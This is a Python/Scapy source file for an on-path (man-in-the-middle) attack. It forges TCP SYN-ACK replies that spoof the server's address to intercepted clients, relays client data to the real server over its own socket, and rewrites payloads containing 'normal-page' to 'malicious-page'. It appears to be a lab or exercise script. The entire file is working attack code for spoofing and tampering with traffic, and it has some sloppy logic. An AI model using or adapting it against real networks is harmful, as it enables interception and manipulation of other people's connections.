from scapy.all import Ether, IP, TCP, sendp
import socket, sys, logging

logging.basicConfig(
  filename="/app/system_debug.log",
  level=logging.INFO,
  format="[%(asctime)s] [%(name)s] %(message)s",
  datefmt="%H:%M:%S"
)

logger = logging.getLogger('SNIFFER')

def handle_syn_ack(dst_mac, src_mac, ip_info, transport_info, interface, ip_dist):
  client_ip = ip_info['Source IP']
  client_mac = dst_mac
  client_port = transport_info['Source Port']
  client_seq = transport_info["Sequence Number"]
  my_mac =  src_mac
  server_port = transport_info["Destination Port"]
  server_ip = ip_info['Destination IP']
  
  logger.info(f"[Sniffer Log] [+] Caught SYN from {client_ip}:{client_port}")
  my_isn = 1000
  
  ether = Ether(dst=client_mac, src=my_mac)
  ip = IP(dst=client_ip, src=server_ip)
  tcp = TCP(
    sport=server_port,
    dport=client_port,
    flags="SA",
    seq=my_isn,
    ack=client_seq + 1,
    window=64240
  )
  syn_ack_packet = ether / ip / tcp
  suniffer_socket = sendp(syn_ack_packet, iface=interface, verbose=False)
  ip_dist[client_ip]['socket'] = suniffer_socket
  logger.info(f"[+] Sent SYN-ACK to {client_ip}:{client_port}")
  
  return ip_dist

def connect_to_server(server_ip, server_port, ip_dist):
  server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  
  try:
    server_sock.connect((server_ip, server_port))
    ip_dist[server_ip]['socket'] = server_sock
    logger.info(f"[+] Connection establised - server")

    return ip_dist
      
  except socket.error as e:
    print(f"[-] Failed to connect server: {e}")
    sys.exit(1)

def handle_transfer_packet(
  interface, dst_ip, dst_mac, socket, payload, is_client=False, src_port=None, ip=None
):
  logger.info(f"Let's connect: {dst_ip}, {dst_mac}, {socket}, {payload}")
  
  if is_client:
    ether = Ether(dst=dst_mac)
    ip_packet = IP(dst=dst_ip, src=ip)
    tcp = TCP(sport=src_port, dport=54321, flags="PA")
    packet = ether / ip_packet / tcp / payload
    sendp(packet, iface=interface, verbose=False)
    print(f"[+] Server response sent back to client {dst_ip} via Scapy!")

  else:
    if socket is not None and len(payload) > 0:
      if b'normal-page' in payload:
        modified_payload = payload.replace(b"normal", b"malicious")
      else:
        modified_payload = payload

      socket.sendall(modified_payload)
      logger.info(f"[+] Packet transfer with malicious modification")
    else:
      logger.warning(f"[-] Cannot send to server: socket is None or payload is empty")